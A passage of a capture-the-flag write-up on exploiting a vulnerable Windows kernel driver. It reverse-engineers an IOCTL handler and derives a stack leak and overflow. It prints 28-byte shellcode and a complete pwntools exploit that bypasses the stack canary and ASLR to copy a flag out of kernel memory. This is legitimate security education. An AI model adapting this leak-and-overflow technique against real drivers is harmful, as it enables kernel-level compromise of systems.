    send_formatted_string(socket, (char*)recvbuf, sizeof(recvbuf), (char*)"Buffer to big");
    fail(-1);
}

// Initialize IOCTL in buffer
IOCTL_in_buffer = malloc(IOCTL_in_buffer_len);
memset(IOCTL_in_buffer, 0x00, IOCTL_in_buffer_len);
send_formatted_string(socket, (char*)recvbuf, sizeof(recvbuf), (char*)"Input buffer:\n");

// Fill IOCTL in buffer
iResult = recv(socket, (char*)IOCTL_in_buffer, IOCTL_in_buffer_len, 0);
if (iResult <= 0) {
    fail(socket);
}
```

After that we are asked to provide the length of the output buffer we are willing to receive (again up to `0x10000` bytes):
```cpp
// Get length of the IOCTL out buffer
send_formatted_string(socket, (char*)recvbuf, sizeof(recvbuf), (char*)"Output buffer length:\n");
IOCTL_out_buffer_len = recv_int(socket);
if (IOCTL_out_buffer_len < 0 || IOCTL_out_buffer_len > 0x10000) {
    send_formatted_string(socket, (char*)recvbuf, sizeof(recvbuf), (char*)"Buffer to big");
    fail(-1);
}

// Initialize IOCTL out buffer
IOCTL_out_buffer = malloc(IOCTL_out_buffer_len);
memset(IOCTL_out_buffer, 0x00, IOCTL_out_buffer_len);
```

With the I/O buffers prepared the code calls into the driver:
```cpp
// Trigger calculation in kernel
DeviceIoControl(hDriver,
    CSCG_DRIVER_IOCTL,
    (LPVOID)IOCTL_in_buffer,
    (DWORD)IOCTL_in_buffer_len,
    IOCTL_out_buffer,
    IOCTL_out_buffer_len,
    &BytesReturned,
    NULL);
```
.. and eventually the results are sent back to us:

```cpp
send_formatted_string(socket, (char*)recvbuf, sizeof(recvbuf), (char*)"Result data:\n");

iSendResult = send(socket, (char*)IOCTL_out_buffer, IOCTL_out_buffer_len, 0);
if (iSendResult == SOCKET_ERROR) {
    fail(socket);
}
```

So far, nothing really stands out.
Let's take a look at the driver. I opened it in Ghidra and attempted to find a function which somewhat resembles the arguments seen above.

This one looks the most promising (I omitted some of the boring stuff):
```cpp
void FUN_004040b0(void *param_1,size_t param_2,void *param_3,size_t param_4) {
  char cVar1;
  code *pcVar2;
  byte bVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  int **in_FS_OFFSET;
  char *local_430;
  char *local_42c;
  int local_428;
  char local_420 [512];  // input buffer
  char local_220 [512];  // output buffer
  int *local_14;
  code *pcStack16;
  uint local_c;
  undefined4 local_8;

  /* .. a little bit of setup omitted .. */

  ProbeForRead(param_1,0x200,1);
  DbgPrintEx(0x4d,3,"[+] UserBuffer: 0x%p\n",param_1);
  DbgPrintEx(0x4d,3,"[+] UserBuffer Size: 0x%X\n",param_2);
  DbgPrintEx(0x4d,3,"[+] KernelBuffer: 0x%p\n",local_220);
  DbgPrintEx(0x4d,3,"[+] KernelBuffer Size: 0x%X\n",0x200);
  memcpy(local_220,param_1,param_2);  // copy operands from userspace buffer

  /* .. actual calculation code omitted .. */

  memcpy(param_3,local_420,param_4);  // copy results back to userspace buffer
  local_8 = 0xfffffffe;
  *in_FS_OFFSET = local_14;
  FUN_004010e0(uVar4 ^ (uint)&stack0xfffffffc);
}
```

Luckily the driver is very verbose, making identification of `param_1`, `param_2` and `local_220` rather easy.
With the second `memcpy` a few lines down we can guess that `param_3` and `param_4` are the result buffer and its size respectively.
The variable `local_14` will hold the result of the calculation in kernel space.

One thing that already sticks out (without looking at anything else really) is the fact that the kernel buffer does seem to have a fixed size of `0x200` bytes.
Abusing the sizes we are able to request (up to `0x10000`) the two parts of the code we will attack are the `memcpy` from (to) userspace for obvious reasons.
Using either of them results in a pretty good stack leak or a very decent stack overflow.

As you can see, there is stack overflow protection protection, but since we have a pretty good leak already, this is no problem for us.
Since things aren't going well enough already, the stack of the driver is executable as well (wtf?).

At this point seems a good time to mention the flag. Essentially the flag is present in the loaded driver as a UTF-16 string.
So we will have to exfiltrate it from there:
```objdump
            u_CSCG{THIS_IS_A_TESTING_FLAG_AAAA_00402040     XREF[1]:     entry:00405077(*)
00402040    43 00 53        unicode    u"CSCG{THIS_IS_A_TESTING_FLAG_AAAAAAAAAAAAAA}"
            00 43 00
            47 00 7b
            ...
```

Building on these findings, I came up with the following exploit plan:
- Query the server to leak a large portion of the stack to get some desperately needed offsets (ASLR is still present)
- Query the server again to overflow the stack:
    - try to put shellcode on the stack which leaks the flag. Since the service will send the data back to us already, we can simply copy the flag into the result buffer.
    - try to repair the execution flow in order to not crash the kernel (somewhat important ;)

Most of the details now really are just counting / finding correct offsets.
I will still try to cover a few important aspects, though.
For the impatient, you can find the exploit, with quite a bunch of commentary, below.

To begin with a little note on the initial stack leak. We cannot leak an arbitrary large number of bytes from the stack (i. e. the maximal number of `0x10000` bytes is not possible). Large buffers will trigger a page fault in `memcpy` thus we have to keep our request reasonably small (about `0x600` is fine).

As you can see from the variable ordering the input buffer is after the output buffer, i. e. the first 512 bytes of the leak will be the actual output buffer, followed by the 512 bytes of the input buffer.
Eventually we will have another 512 bytes of leaked stack data.

If we place a breakpoint within the function outlined above, we can take a look at the call stack:
```objdump
#0  0xf6f841e7 in ?? () from /home/foo/cscg-2021/cscg_driver.sys
#1  0xf6f840a4 in ?? () from /home/foo/cscg-2021/cscg_driver.sys
#2  0xf6f8467c in ?? () from /home/foo/cscg-2021/cscg_driver.sys
#3  0x808989cd in @IofCallDriver@8 at ntoskrnl/io/iomgr/irp.c:1286
#4  0x8088ca21 in IopPerformSynchronousRequest@28 at ntoskrnl/io/iomgr/iofunc.c:142
#5  0x8088d6f2 in IopDeviceFsIoControl@44 at ntoskrnl/io/iomgr/iofunc.c:639
#6  0x8088ea65 in NtDeviceIoControlFile@40 at ntoskrnl/io/iomgr/iofunc.c:1440
#7  0x809ba935 in KiSystemCallTrampoline at ntoskrnl/include/internal/i386/ke.h:712
```
As you can see the driver eventually returns to `0x808989cd`.
Without knowing a lot of Windows or how drivers are called, recovering the call frame of the last function within the driver code seems to be good idea (return to #2, `0xf6f8467c`).
This leaves space of only one call frame for shellcode but this will probably be enough anyway.

Inspecting the leak we get when requesting an output buffer of `0x600` bytes we can spot this address a few bytes in (the first `0x400` bytes are omitted):
```objdump
  ESP    |   offset  |   value
f6eee8c4    (+0000)     b88a6042
f6eee8c8    (+0004)     f6eee464
f6eee8cc    (+0008)     0000002a
f6eee8d0    (+000C)     ffffffff
f6eee8d4    (+0010)     f6f81160
f6eee8d8    (+0014)     b89cab92
f6eee8dc    (+0018)     00000000
f6eee8e0    (+001C)     f6eee914   # call frame address   -------
f6eee8e4    (+0020)     f6f840a4   # actual return addresses    |
f6eee8e8    (+0024)     00137f88   # userspace buffer: input    |
f6eee8ec    (+0028)     0000000c   # .. and its size            |
f6eee8f0    (+002C)     00138820   # userspace buffer: output   |
f6eee8f4    (+0030)     00000600   # .. and its size            |
f6eee8f8    (+0034)     00000001  <---                          |
f6eee9fc    (+0038)     c0000001     |                          |
f6eee900    (+003C)     0000000c     |                          |
f6eee904    (+0040)     00000600     | room for shellcode       |
f6eee908    (+0044)     00000000     |                          |
f6eee90c    (+0048)     00137f88     |                          |
f6eee910    (+004C)     00138820  <---                          |
f6eee914    (+0050)     f6eee93c                              <--
f6eee918    (+0054)     f6f8467c   # return address to outer function (#3 above)
...
```

Note that the addresses of the input buffer and the output buffer are on the stack as well.
We have to care to keep those addresses in tact as the second `memcpy` (results back to userspace) will use them (Actually only the second one, but you know).
This leaves us with exactly 28 bytes of space for shellcode (if we try to leave the next call frame in tact, what we will attempt to do, to make things easier).

Note that we cannot write the shellcode before `0xf6eee8e0` (+`0x1c`, the address of the return address) because any update to `ESP` will invalidate any data on the stack before the top address (I do not know why this is the case, if you do, please let me know!).
Eventually the shellcode shall restore `EBP` to point to `0xf6eee914` so that we can restore the normal control flow using a standard function epilogue:
```objdump
004040aa 8b e5           MOV ESP,EBP
004040ac 5d              POP EBP
004040ad c2              RET
```

A somewhat reasonably short shellcode I came up with is the following:
```asm
mov esi, 0xF6F82040     ; position of flag
mov edi, 0x00138E50     ; output buffer
mov ecx, 0x00000054     ; length of the flag
rep movsb
                        ; note that we actually do not need to restore ebp as it
                        ; is already pointing to the correct address
mov eax, 0xF6F840AA     ; address of the epilogue gadget
jmp eax
```

You might be wondering why the address of the output buffer changed.
Well, this is the second request to the service, which will allocate a new buffer.
We therefor have to predict the address of the second allocation.
Since this is pretty deterministic, it is quite easy.
(If the service would be running indefinitely it would be a little bit harder, but it is pretty much crashing after each client connection closes so we are always in a clean state)

That's it! A complete exploit may look like this (note that the relevant part is merely 4 lines):
```python
from pwn import *
import os

# io = process(["ncat", "--ssl", "deadbeefdeadbeefdeadbeef-caaks.challenge.broker.cscg.live", "31337"])
io = process(["ncat", "127.0.0.1", "31337"])

# we'll use this to spot our payload more easily in memory
sentinel = b"\xEA\xEA\xEA\xEA\x00+\x00\xDB\xDB\xDB\xDB\x00"

io.sendline("1")
io.sendlineafter("Input buffer length:", str(len(sentinel)))
io.sendafter("Input buffer:", sentinel)
io.sendlineafter("Output buffer length:", str(512*3))
io.recvuntil("data:\n")

buff = b""

while len(buff) < 512 * 3:
    buff += io.recv(512*3 - len(buff))

print("Leak:")
for i in range(1024, len(buff), 4):
    print(f"{i - 1024:04X}\t", buff[i:i+4][::-1].hex())

ebp = u32(buff[1024 + 4:1024 + 4 + 4]) + 0x47c
print("ebp leak =", hex(ebp))

# address of kernel buffers (input / output)
ik_buf = ebp - 540
ok_buf = ebp - 540 - 512

print("ik_buf =", hex(ik_buf))
print("ok_buf =", hex(ok_buf))

# address of first userspace buffers (input / output)
iu_buf0 = u32(buff[1024 + 0x24:1024 + 0x24 + 4])
ou_buf0 = u32(buff[1024 + 0x2c:1024 + 0x2c + 4])

print("iu_buf0 =", hex(iu_buf0))
print("ou_buf0 =", hex(ou_buf0))

# will-be-address of our shellcode
ret = ebp + 0x18
print("new ret =", hex(ret))

flag_pat = "CSCG{THIS_IS_A_TESTING_FLAG_AAAAAAAAAAAAAA}"
flag_len = len(flag_pat) * 2  # because of UTF-16 encoding

# predicted addresses of second userspace buffers (input / output)
iu_buf1 = iu_buf0 + 56
ou_buf1 = ou_buf0 + 1584

print("iu_buf1 guess =", hex(iu_buf1))
print("ou_buf1 guess =", hex(ou_buf1))

# address of the flag
flag_pos = u32(buff[1024 + 0x20: 1024 + 0x20 + 4]) - 0x2064

# address of return address to the "outermost" function of the CSCG-driver (before returnung to legitimate kernel code)
# we do not need really need this, but it is nice for debugging
old_ret = u32(buff[1024 + 0x54: 1024 + 0x54 + 4])

# position of the call frame of the above mentioned function (we have to restore it, in order to not crash the kernel)
call_frame = ebp + 0x10 + 9*4
# address to a function epilogue gadget
tail_jmp = old_ret - 0x5d0 - 2  # mov esp, ebp; pop ebp; ret;

print("flag_pos =", hex(flag_pos))
print("old ret =", hex(old_ret))
print("call frame =", hex(call_frame))

# notice the jump at the end. For some reason they never were compiled correctly
# so I had to resort to the jmp eax trick
code_src = f"""
.section .text
.globl _start
.intel_syntax noprefix
_start:
    mov esi, 0x{flag_pos:08X}
    mov edi, 0x{ou_buf1:08X}
    mov ecx, 0x{flag_len:08X}
    rep movsb
    ; mov ebp, 0x{call_frame:08X} ; <-- actually not needed, since it is already set up.
    mov eax, 0x{tail_jmp:08X}
    jmp eax
"""

# ignore this ugly piece ..
# fcking pwntools asm module. never works..
def compile_code(src):
    with open("shellcode.s", "w") as f:
        f.write(src)
    os.system("as -32 -o shellcode.o shellcode.s")
    os.system("objcopy -O binary shellcode.o shellcode.bin")
    with open("shellcode.bin", "rb") as fin:
        code = fin.read()

    return code

print("Shellcode:")
print(code_src)
code = compile_code(code_src)
print("-->", code.hex(), f"({len(code)})")

# We have to keep the shellcode small, because otherwise we would destroy the stack of the
# kernel code which transfers control back to user space.
# This is not an enforced constraint, but limiting the shellcode to this size makes things
# a lot easier.
assert len(code) <= 28
code += b"\x00" * (28 - len(code))

payload = sentinel + (512 - len(sentinel)) * b"\xAA"

# notice that we restore the stack up to 0x20 bytes (which circumvents overflow protection and other accidents)
# after that we place our desired return address (pointing to the code a few bytes in)
# then we repair the following entries which hold the pointers and sizes to our
# (userspace) input buffers. we have to give them reasonable values because the
# second memcpy will use those values
payload += buff[1024:1024 + 0x20] + p32(ret) + p32(iu_buf1) + p32(0x123) + p32(ou_buf1) + p32(0x200) + code

print("len(payload) =", hex(len(payload)))

io.sendline("1")
io.sendlineafter("Input buffer length:", str(len(payload)))
io.sendafter("Input buffer:", payload)
io.sendlineafter("Output buffer length:", str(512*3))
io.recvuntil("data:\n")

# spot the flag in the leak, ignore every other null-byte
# Sometimes this does not work for reasons. I would assume the causes are page boundaries ?
# Anyway if you cannot find the flag, add an offset to the flag position above.
# The first character of the flag seems to always leak. The rest is not always there.
# (You can debug the shellcode, the flag is copied to the user buffer, but userspace
# does not actually see it ¯\_(ツ)_/¯)
io.interactive()
```
